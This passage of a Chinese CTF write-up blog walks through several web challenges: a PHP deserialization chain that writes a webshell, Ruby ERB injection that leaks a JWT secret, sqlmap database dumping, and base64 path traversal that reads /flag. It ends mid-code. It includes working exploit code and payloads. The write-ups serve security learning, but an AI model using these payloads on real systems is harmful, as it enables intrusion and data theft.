alt="image-20220201100402396"></p><p>这里可以上传文件 <code>/index.php/home</code> 这是用Discuz的搭建的，应该有源码</p><p>访问 <code>url/www.tar.gz</code> 获取源码</p><p>拿到框架以后搜索高危函数</p><p>在 <code>controller\Index.php</code> 中存在unserialize函数</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202011030993.png" alt="image-20220201103029895"></p><p>这里对cookie中的user编码进行反序列化，看看profile的值，是否可控。然后来到profile.php</p><p>这里负责实现文件上传的业务逻辑</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">web</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Profile</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$checker</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename_tmp</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$upload_menu</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ext</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$img</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$except</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;checker=<span class="hljs-keyword">new</span> Index();<br>        <span class="hljs-keyword">$this</span>-&gt;upload_menu=md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>        @chdir(<span class="hljs-string">&quot;../public/upload&quot;</span>);<br>        <span class="hljs-keyword">if</span>(!is_dir(<span class="hljs-keyword">$this</span>-&gt;upload_menu))&#123;<br>            @mkdir(<span class="hljs-keyword">$this</span>-&gt;upload_menu);<br>        &#125;<br>        @chdir(<span class="hljs-keyword">$this</span>-&gt;upload_menu);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_img</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;checker)&#123;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">$this</span>-&gt;checker-&gt;login_check())&#123;<br>                <span class="hljs-variable">$curr_url</span>=<span class="hljs-string">&quot;http://&quot;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="hljs-string">&quot;/index&quot;</span>;<br>                <span class="hljs-keyword">$this</span>-&gt;redirect(<span class="hljs-variable">$curr_url</span>,<span class="hljs-number">302</span>);<br>                <span class="hljs-keyword">exit</span>();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>))&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;filename_tmp=<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-keyword">$this</span>-&gt;filename=md5(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]).<span class="hljs-string">&quot;.png&quot;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;ext_check();<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;ext) &#123;<br>            <span class="hljs-keyword">if</span>(getimagesize(<span class="hljs-keyword">$this</span>-&gt;filename_tmp)) &#123;<br>                @copy(<span class="hljs-keyword">$this</span>-&gt;filename_tmp, <span class="hljs-keyword">$this</span>-&gt;filename);<br>                @unlink(<span class="hljs-keyword">$this</span>-&gt;filename_tmp);<br>                <span class="hljs-keyword">$this</span>-&gt;img=<span class="hljs-string">&quot;../upload/<span class="hljs-subst">$this</span>-&gt;upload_menu/<span class="hljs-subst">$this</span>-&gt;filename&quot;</span>;<br>                <span class="hljs-keyword">$this</span>-&gt;update_img();<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;Forbidden type!&#x27;</span>, url(<span class="hljs-string">&#x27;../index&#x27;</span>));<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;Unknow file type!&#x27;</span>, url(<span class="hljs-string">&#x27;../index&#x27;</span>));<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_img</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$user_info</span>=db(<span class="hljs-string">&#x27;user&#x27;</span>)-&gt;where(<span class="hljs-string">&quot;ID&quot;</span>,<span class="hljs-keyword">$this</span>-&gt;checker-&gt;profile[<span class="hljs-string">&#x27;ID&#x27;</span>])-&gt;find();<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$user_info</span>[<span class="hljs-string">&#x27;img&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">$this</span>-&gt;img)&#123;<br>            <span class="hljs-keyword">if</span>(db(<span class="hljs-string">&#x27;user&#x27;</span>)-&gt;where(<span class="hljs-string">&#x27;ID&#x27;</span>,<span class="hljs-variable">$user_info</span>[<span class="hljs-string">&#x27;ID&#x27;</span>])-&gt;data([<span class="hljs-string">&quot;img&quot;</span>=&gt;addslashes(<span class="hljs-keyword">$this</span>-&gt;img)])-&gt;update())&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;update_cookie();<br>                <span class="hljs-keyword">$this</span>-&gt;success(<span class="hljs-string">&#x27;Upload img successful!&#x27;</span>, url(<span class="hljs-string">&#x27;../home&#x27;</span>));<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;Upload file failed!&#x27;</span>, url(<span class="hljs-string">&#x27;../index&#x27;</span>));<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_cookie</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;checker-&gt;profile[<span class="hljs-string">&#x27;img&#x27;</span>]=<span class="hljs-keyword">$this</span>-&gt;img;<br>        cookie(<span class="hljs-string">&quot;user&quot;</span>,base64_encode(serialize(<span class="hljs-keyword">$this</span>-&gt;checker-&gt;profile)),<span class="hljs-number">3600</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ext_check</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$ext_arr</span>=explode(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-keyword">$this</span>-&gt;filename);<br>        <span class="hljs-keyword">$this</span>-&gt;ext=end(<span class="hljs-variable">$ext_arr</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;ext==<span class="hljs-string">&quot;png&quot;</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;except[<span class="hljs-variable">$name</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;&#123;<span class="hljs-variable">$name</span>&#125;)&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;&#123;<span class="hljs-keyword">$this</span>-&gt;&#123;<span class="hljs-variable">$name</span>&#125;&#125;(<span class="hljs-variable">$arguments</span>);<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这个 <code>__get</code>和<code>__call</code>怎么触发？</p><p>在register.php中发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">$this</span>-&gt;registed)&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;checker-&gt;index();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>registed可控 ，如果给checker一个序列化的Profile就会触发Profile::_call</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;&#123;<span class="hljs-variable">$name</span>&#125;)&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;&#123;<span class="hljs-keyword">$this</span>-&gt;&#123;<span class="hljs-variable">$name</span>&#125;&#125;(<span class="hljs-variable">$arguments</span>);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>没有参数，然后变成 $this-&gt;index </p><p>这是个不可获得属性然后走Profile:: __get()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;except[<span class="hljs-variable">$name</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>我们令 <code>except[$name]=array(&quot;index&quot;=&gt;&quot;upload_img&quot;)</code> 即访问 index 这个变量，就会返回upload_img这个函数</p><p>然后再看upload_img的部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_img</span>(<span class="hljs-params"></span>)</span>&#123;<br>    ...<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>))&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;filename_tmp=<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-keyword">$this</span>-&gt;filename=md5(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]).<span class="hljs-string">&quot;.png&quot;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;ext_check();<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;ext) &#123;<br>            <span class="hljs-keyword">if</span>(getimagesize(<span class="hljs-keyword">$this</span>-&gt;filename_tmp)) &#123;<br>                @copy(<span class="hljs-keyword">$this</span>-&gt;filename_tmp, <span class="hljs-keyword">$this</span>-&gt;filename);   <span class="hljs-comment">//copy两个参数可控，所以filename_tmp是shell内容后者生效的webshell</span><br>                @unlink(<span class="hljs-keyword">$this</span>-&gt;filename_tmp);<br>                <span class="hljs-keyword">$this</span>-&gt;img=<span class="hljs-string">&quot;../upload/<span class="hljs-subst">$this</span>-&gt;upload_menu/<span class="hljs-subst">$this</span>-&gt;filename&quot;</span>;<br>                <span class="hljs-keyword">$this</span>-&gt;update_img();<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;Forbidden type!&#x27;</span>, url(<span class="hljs-string">&#x27;../index&#x27;</span>));<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;Unknow file type!&#x27;</span>, url(<span class="hljs-string">&#x27;../index&#x27;</span>));<br>        &#125;<br></code></pre></td></tr></table></figure><p>只要$FILES数组非空就可以直接进下一个if语句，这样只要之前上传过文件就可以解决了</p><p>然后再 Index.php发现  反序列化入口 所以我们需要更改 cookie[‘user’]</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login_check</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$profile</span>=cookie(<span class="hljs-string">&#x27;user&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$profile</span>))&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;profile=unserialize(base64_decode(<span class="hljs-variable">$profile</span>));<br>        <span class="hljs-keyword">$this</span>-&gt;profile_db=db(<span class="hljs-string">&#x27;user&#x27;</span>)-&gt;where(<span class="hljs-string">&quot;ID&quot;</span>,intval(<span class="hljs-keyword">$this</span>-&gt;profile[<span class="hljs-string">&#x27;ID&#x27;</span>]))-&gt;find();<br>        <span class="hljs-keyword">if</span>(array_diff(<span class="hljs-keyword">$this</span>-&gt;profile_db,<span class="hljs-keyword">$this</span>-&gt;profile)==<span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>先上传个文件拿到路径</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202082354372.png" alt="image-20220208235431147"></p><p>给图片添加文件头成功上传，随后重新登录获取文件路径</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">../upload/<span class="hljs-keyword">cc</span><span class="hljs-number">551</span>ab<span class="hljs-number">005</span>b<span class="hljs-number">2e60</span>fbdc<span class="hljs-number">88</span>de<span class="hljs-number">809</span>b<span class="hljs-number">2</span><span class="hljs-keyword">c</span><span class="hljs-number">4</span>b<span class="hljs-number">1</span>/f<span class="hljs-number">3</span>b<span class="hljs-number">94e88</span>bd<span class="hljs-number">1</span>bd<span class="hljs-number">325</span>af<span class="hljs-number">6</span>f<span class="hljs-number">62828</span><span class="hljs-keyword">c</span><span class="hljs-number">8785</span>dd.png<br></code></pre></td></tr></table></figure><p>构建exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">web</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Register</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$checker</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$registed</span> =<span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Profile</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$checker</span> =<span class="hljs-number">0</span> ;<span class="hljs-comment">//目的是绕过index类的检查，防止退出程序</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename_tmp</span>=<span class="hljs-string">&quot;./upload/cc551ab005b2e60fbdc88de809b2c4b1/f3b94e88bd1bd325af6f62828c8785dd.png&quot;</span>;  <span class="hljs-comment">//webshell</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;upload/shell.php&quot;</span>;  <span class="hljs-comment">//shell地址</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ext</span>=<span class="hljs-number">1</span>;  <span class="hljs-comment">//直接进入file_exist的下一个循环</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$except</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;index&quot;</span>=&gt;<span class="hljs-string">&quot;upload_img&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Register();<br><span class="hljs-variable">$a</span>-&gt;checker = <span class="hljs-keyword">new</span> Profile();<br><span class="hljs-variable">$a</span>-&gt;checker-&gt;checker=<span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-comment">//TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo3OntzOjc6ImNoZWNrZXIiO2k6MDtzOjEyOiJmaWxlbmFtZV90bXAiO3M6Nzg6Ii4vdXBsb2FkL2NjNTUxYWIwMDViMmU2MGZiZGM4OGRlODA5YjJjNGIxL2YzYjk0ZTg4YmQxYmQzMjVhZjZmNjI4MjhjODc4NWRkLnBuZyI7czoxMToidXBsb2FkX21lbnUiO047czo4OiJmaWxlbmFtZSI7czoxNzoidXBsb2FkL3BlbnNvbi5waHAiO3M6MzoiZXh0IjtpOjE7czozOiJpbWciO047czo2OiJleGNlcHQiO2E6MTp7czo1OiJpbmRleCI7czoxMDoidXBsb2FkX2ltZyI7fX1zOjg6InJlZ2lzdGVkIjtpOjA7fQ==</span><br></code></pre></td></tr></table></figure><p>然后修改cookie[user] 为上一步的结果</p><p>来到创建的 &#x2F;upload&#x2F;shell.php 随后蚁剑连接就好</p><h2 id="SCTF2019-Flag-Shop"><a href="#SCTF2019-Flag-Shop" class="headerlink" title="[SCTF2019]Flag Shop"></a>[SCTF2019]Flag Shop</h2><p> 商店类题目，robots.txt 里指向的文件存在泄露的源码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js">get <span class="hljs-string">&quot;/work&quot;</span> <span class="hljs-keyword">do</span><br>  islogin<br>  auth = JWT.decode cookies[:auth],ENV[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-literal">true</span>, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;<br>  auth = auth[<span class="hljs-number">0</span>]<br>  unless params[:SECRET].nil?<br>    <span class="hljs-keyword">if</span> ENV[<span class="hljs-string">&quot;SECRET&quot;</span>].match(<span class="hljs-string">&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;</span>)<br>      puts ENV[<span class="hljs-string">&quot;FLAG&quot;</span>]<br>    end<br>  end<br><br></code></pre></td></tr></table></figure><p>同时在cookie中发现jwt</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202030836836.png" alt="image-20220203083649690"></p><p>解密结果</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;alg&quot;</span>: <span class="hljs-string">&quot;HS256&quot;</span><br>&#125;<br>&#123;<br>  <span class="hljs-attr">&quot;uid&quot;</span>: <span class="hljs-string">&quot;1df4fa41-1cae-43e2-81c3-d9a856d4b2f9&quot;</span>,<br>  <span class="hljs-attr">&quot;jkl&quot;</span>: <span class="hljs-number">21</span><br>&#125;<br></code></pre></td></tr></table></figure><p>存在加密算法，然后就要去搞secretkey</p><p>这里还考察了Ruby ERB  <a href="https://www.anquanke.com/post/id/86867">https://www.anquanke.com/post/id/86867</a></p><p>这常常与模板挂钩或者需要渲染的地方比如预览等其他功能</p><p>然后结合ruby的预定义变量</p><p><code>$&#39; The string to the right of the last successful match.</code></p><p>构造<code>do=&lt;%=$&#39;%&gt; is working</code>和<code>name=&lt;%=$&#39;%&gt;</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202030958889.png" alt="image-20220203095857806"></p><p>然后根据这个key去生成新的jwt</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202031015093.png" alt="image-20220203101545008"></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202031016069.png" alt="image-20220203101629976"></p><p>购买成功后flag在cookie里解密就行</p><h2 id="b01lers2020-Life-on-Mars"><a href="#b01lers2020-Life-on-Mars" class="headerlink" title="[b01lers2020]Life on Mars"></a>[b01lers2020]Life on Mars</h2><p>类似一个手册站点</p><p>没有源码泄露应该就是sql注入了</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202031050901.png" alt="image-20220203105016822"></p><p>发现注入点</p><p>然后上sqlmap就行了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"> python sqlmap.py -u &quot;http://40beda4f-8d7b-4392-a0c3-620849fb7a1b.node4.buuoj.cn:81/query?search=amazonis_planitia&amp;&#123;&#125;&amp;_=1643854704130&quot;  --dbs<br><br>python sqlmap.py -u &quot;http://40beda4f-8d7b-4392-a0c3-620849fb7a1b.node4.buuoj.cn:81/query?search=amazonis_planitia&amp;&#123;&#125;&amp;_=1643854704130&quot;  -D alien_code --dump-all<br></code></pre></td></tr></table></figure><h2 id="GKCTF-2021-easycms"><a href="#GKCTF-2021-easycms" class="headerlink" title="[GKCTF 2021]easycms"></a>[GKCTF 2021]easycms</h2><p>后台地址 &#x2F;admin.php</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202031416156.png" alt="image-20220203141631073"></p><p>用户名密码 admin &#x2F; 12345</p><p>在导出主题的部分 发现文件下载的链接</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /admin.php?m=ui&amp;f=downloadtheme&amp;theme=L<span class="hljs-number">3</span>Zhci<span class="hljs-number">93</span>d<span class="hljs-number">3</span>cvaHRtbC<span class="hljs-number">9</span>zeXN<span class="hljs-number">0</span>ZW<span class="hljs-number">0</span>vdG<span class="hljs-number">1</span>wL<span class="hljs-number">3</span>RoZW<span class="hljs-number">1</span>lL<span class="hljs-number">2</span>RlZmF<span class="hljs-number">1</span>bHQvMS<span class="hljs-number">56</span>aXA=<br></code></pre></td></tr></table></figure><p>后面这个theme的内容为 &#x2F;var&#x2F;www&#x2F;html&#x2F;system&#x2F;tmp&#x2F;theme&#x2F;default&#x2F;1.zip</p><p>重新构造</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">GET</span> /admin.php?<span class="hljs-attribute">m</span>=ui&amp;f=downloadtheme&amp;theme=L2ZsYWc=<br></code></pre></td></tr></table></figure><p>解码结果 &#x2F;flag</p><p>成功获取flag</p><h2 id="LCTF2018-bestphp’s-revenge"><a href="#LCTF2018-bestphp’s-revenge" class="headerlink" title="[LCTF2018]bestphp’s revenge"></a>[LCTF2018]bestphp’s revenge</h2><p>这篇文章写的很好了 <a href="https://cloud.tencent.com/developer/article/1376384">https://cloud.tencent.com/developer/article/1376384</a></p><p>下面是</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;implode&#x27;</span>;<br>call_user_func(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>], <span class="hljs-variable">$_POST</span>);<br>session_start();<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span 